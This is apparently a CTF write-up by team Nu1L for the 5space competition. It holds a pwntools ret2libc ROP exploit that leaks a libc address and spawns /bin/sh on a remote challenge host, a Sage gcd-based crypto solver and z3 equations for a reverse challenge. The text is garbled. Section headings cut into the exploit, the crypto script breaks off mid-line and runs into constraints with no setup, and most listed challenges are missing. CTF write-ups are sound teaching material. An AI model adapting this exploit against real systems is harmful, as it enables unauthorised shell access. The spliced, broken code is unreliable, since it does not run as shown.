5space WrtieUp By Nu1L
5space WrtieUp By Nu1L
Pwn
H3llOR0P
Crypto
5_vgcd
Reverse
5_crackme
crackme_2
Web
5_web_BaliYun
5_web_Eeeeasy_SQL
eazylogin
5_web_letmeguess_1
Database
cloudsql_reveage
Misc
sakan
sakana_revenge
5_Misc_m@sTeR_0f
Pwn
H3llOR0P
from pwn import *
# p = process('./H3ll0Rop')
p = remote('123.56.175.221', '14454')
elf = ELF('./H3ll0Rop')
libc = ELF('./libc-2.23.so')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln = elf.sym['vuln']
pop_rdi = 0x0000000000400753
payload = b'a'*104 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.recvuntil(b'me???\n\n')
p.sendline(payload)
p.recvuntil(b'pwn it\n\n')
puts_real = u64(p.recvline()[:-1].ljust(8,b'\x00'))
libc.address = puts_real - libc.sym['puts']
# p.interactive()
Crypto
5_vgcd
Reverse
system = libc.sym['system']
binsh = next(libc.search('/bin/sh\x00'.encode()))
payload = b'a'*104 + p64(pop_rdi) + p64(binsh) + p64(system) + p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
from Crypto.Util.number import *
from random import getrandbits, seed
from gmpy2 import mpz
import gmpy2
from tqdm import tqdm
from multiprocessing import Pool
from sage.all import *
with open('/mnt/f/ctf/5space2022/3074f5e0c/output3.txt', 'r') as f:
    n = eval(f.readline().strip())
    c = eval(f.readline().strip())
    xs_ = eval(f.readline().strip())
    xs_ += eval(f.readline().strip())
    xs_ += eval(f.readline().strip())
    xs_ += eval(f.readline().strip())
    xs_ += eval(f.readline().strip())
for i in range(len(xs_)):
    for j in range(i+1, len(xs_)):
        x1 = xs_[i][0] - xs_[j][0]
        x2 = xs_[i][1] - xs_[j][1]
        phigh = int(gcd(x1, x2))
        if phigh.bit_length() > 200 and isPrime(phigh):
            P. = PolynomialRing(Zmod(n))
            kbits = 512 - 288
            phigh = phigh  0)
S.add(159947 * v1[0] - 17274276 == 0)
S.add(-76194 * v1[1] - 288728 * v1[0] + 36973368 == 0)
S.add(-247146 * v1[1] - 291401 * v1[0] - 166371 * v1[2] + 75709167 == 0)
S.add(-1741 * v1[1] + 218084 * v1[3] + 280814 * v1[0] - 149372 * v1[2] - 33947928 == 0)
S.add(174323 * v1[3] + 136024 * v1[2] - 141923 * v1[1] - 301049 * v1[4] + 323059 * 
v1[0] - 53238195 == 0)
S.add(-12269 * v1[3] + 286713 * v1[1] - 78320 * v1[0] + 301362 * v1[2] + 269836 * v1[5] 
- 255324 * v1[4] - 99312448 == 0)
S.add(
  -103798 * v1[2]
  + 201146 * v1[5]
  - 285406 * v1[3]
  - 188094 * v1[4]
  - 104025 * v1[0]
  - 50098 * v1[1]
  - 109789 * v1[6]
  + 50727897 == 0)
S.add(
  117443 * v1[7]
  + 275692 * v1[3]
  + 349275 * v1[1]
  - 381943 * v1[2]
  + 332376 * v1[4]
  - 269146 * v1[5]
  + 222994 * v1[6]
  - 267344 * v1[0]
  + 9817748 == 0)
S.add(
  19156 * v1[6]
  + -281586 * v1[7]
  - 168850 * v1[0]
  + 363716 * v1[3]
  - 32886 * v1[1]
  + 44299 * v1[4]
  + 170590 * v1[8]
  + 81061 * v1[5]
  + 201865 * v1[2]
  - 32987442 == 0)
S.add(
  22459 * v1[6]
  + -80349 * v1[1]
  + 239015 * v1[5]
  - 42367 * v1[9]
  - 113712 * v1[7]
  - 146568 * v1[2]
  + 241696 * v1[3]
  + 232212 * v1[0]
  - 162511 * v1[8]
  + 61621 * v1[4]
  - 41031017 == 0)
S.add(
  -1754 * v1[0]
  + 128062 * v1[7]
  - 329492 * v1[3]
  - 167316 * v1[2]
  - 178991 * v1[4]
  + 186377 * v1[10]
  + 307270 * v1[6]
  - 328477 * v1[8]
  + 248665 * v1[1]
  + 374863 * v1[9]
  + 373711 * v1[5]
  - 86829517 == 0)
S.add(
  11843 * v1[5]
  + 17087 * v1[3]
  - 35818 * v1[0]
  - 182330 * v1[7]
  - 354816 * v1[4]
  - 126036 * v1[2]
  + 114656 * v1[8]
  - 90442 * v1[9]
  + 330888 * v1[11]
  + 78226 * v1[10]
  - 260641 * v1[1]
  + 105414 * v1[6]
  + 63250156 == 0)
S.add(
  7469 * v1[9]
  + 6283 * v1[11]
  + -87345 * v1[2]
  + 248111 * v1[5]
  + 213581 * v1[4]
  + 89194 * v1[8]
  + 36305 * v1[6]
  + 98667 * v1[1]
  + 300755 * v1[12]
  + 191415 * v1[7]
  + 350540 * v1[0]
  + 359565 * v1[10]
  - 185365 * v1[3]
  - 165783260 == 0)
S.add(
  8209 * v1[8]
  + 131781 * v1[1]
  + 152898 * v1[0]
  + 40158 * v1[11]
  - 86271 * v1[12]
  - 105755 * v1[6]
  + 264037 * v1[3]
  - 130948 * v1[10]
  - 243572 * v1[7]
  - 48159 * v1[2]
  - 269443 * v1[9]
  - 376534 * v1[5]
  - 67954 * v1[4]
  - 119669 * v1[13]
  + 117580744 == 0)
S.add(
  -3429 * v1[6]
  + 102230 * v1[5]
  + 126967 * v1[10]
  - 344174 * v1[8]
  - 225911 * v1[11]
  + 118364 * v1[14]
  - 72044 * v1[1]
  + 280519 * v1[0]
  - 241789 * v1[2]
  - 274918 * v1[9]
  - 91055 * v1[12]
  - 122403 * v1[3]
  + 118907 * v1[7]
  - 34240 * v1[13]
  + 240524 * v1[4]
  + 35507568 == 0)
S.add(
  -24137 * v1[9]
  + 28203 * v1[13]
  + 150213 * v1[1]
  + 311204 * v1[0]
  - 94750 * v1[7]
  + 130029 * v1[2]
  - 305057 * v1[14]
  + 176246 * v1[5]
  - 256662 * v1[8]
  - 331010 * v1[12]
  - 301118 * v1[4]
  - 309379 * v1[10]
  + 187867 * v1[3]
  - 102250 * v1[11]
  - 340412 * v1[15]
  + 144084 * v1[6]
  + 39635710 == 0)
S.add(
  -27445 * v1[12]
  + -289483 * v1[10]
  - 164045 * v1[16]
  - 218276 * v1[1]
  + 183266 * v1[3]
  - 311967 * v1[8]
  - 55127 * v1[14]
  - 211824 * v1[13]
  - 375628 * v1[9]
  - 201931 * v1[0]
  - 324618 * v1[4]
  + 52026 * v1[6]
  + 93926 * v1[5]
  - 105199 * v1[7]
  - 254102 * v1[15]
  - 159881 * v1[11]
  + 378091 * v1[2]
  + 106013500 == 0)
S.add(
  27619 * v1[4]
  + 9873 * v1[1]
  + -23276 * v1[8]
  + -196254 * v1[9]
  + 181235 * v1[0]
  + 150865 * v1[16]
  - 148807 * v1[14]
  - 272020 * v1[17]
  - 346803 * v1[2]
  - 65537 * v1[3]
  + 132879 * v1[10]
  + 239833 * v1[6]
  - 151023 * v1[11]
  + 224631 * v1[12]
  + 294607 * v1[5]
  - 362447 * v1[7]
  - 110250 * v1[15]
  + 153229 * v1[13]
  + 56953741 == 0)
S.add(
  -1159 * v1[1]
  + 6659 * v1[6]
  + -25875 * v1[7]
  + 80743 * v1[10]
  + 38124 * v1[9]